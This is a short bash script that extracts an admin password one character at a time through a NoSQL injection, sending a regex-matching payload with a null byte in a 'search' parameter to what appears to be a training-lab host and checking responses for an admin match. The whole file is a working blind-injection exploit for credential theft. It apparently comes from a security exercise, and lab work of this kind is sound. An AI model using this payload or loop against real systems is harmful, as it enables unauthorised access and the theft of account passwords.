#!/bin/bash

pass=""

while true; do
	for s in {a..z} {0..9} -; do
		echo test:$pass$s
		res=$(curl -s 'http://ptl-d8798de3-271911b6.libcurl.st/?search=admin%27%20%26%26%20this.password.match(/^'$pass$s'/)%00' | grep ">admin<")
		if [ ! -z "$res" ]; then pass=$pass$s; echo pass:$pass; break; fi
	done
done
